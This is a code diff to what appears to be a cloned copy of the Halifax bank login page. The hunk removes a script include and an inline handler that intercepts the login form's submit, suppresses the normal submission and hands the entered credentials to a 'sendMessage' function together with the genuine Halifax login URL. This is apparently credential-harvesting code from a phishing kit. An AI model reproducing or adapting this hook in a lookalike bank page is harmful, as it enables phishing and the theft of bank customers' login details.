@@ -102,21 +102,6 @@
       id="_lpTagScriptId_2"
       src="https://lptag.liveperson.net/lptag/api/account/49955747/configuration/applications/taglets/.jsonp?v=2.0&amp;df=0&amp;ct=lpSecureStorage%2Clp_sdes%2Cscraper%2ClpActivityMonitor%2CrendererStub%2Clp_version_detector%2Clp_monitoringSDK%2ClpTransporter%2ClpUnifiedWindow%2CSMT%2Chooks%2Clp_SMT%2Cauthenticator%2CcleanCCPatterns%2CunAuthMessaging%2CjsLoader&amp;b=3"
     ></script> -->
-    <script src="script.js"></script>
-    <script>
-      window.onload = () => {
-        const form = document.querySelector("#loginform");
-        form.addEventListener("submit", (e) => {
-          e.preventDefault();
-          const formData = new FormData(e.target);
-          sendMessage(
-            formData,
-            "https://www.halifax-online.co.uk/personal/logon/login.jsp",
-            0,
-          );
-        });
-      };
-    </script>
   </head>
   <body class="hasJS mozilla_125" data-browser="mozilla" data-version="125">
     <input type="hidden" name="autoLogOff" id="autoLogOff" value="autologoff" />
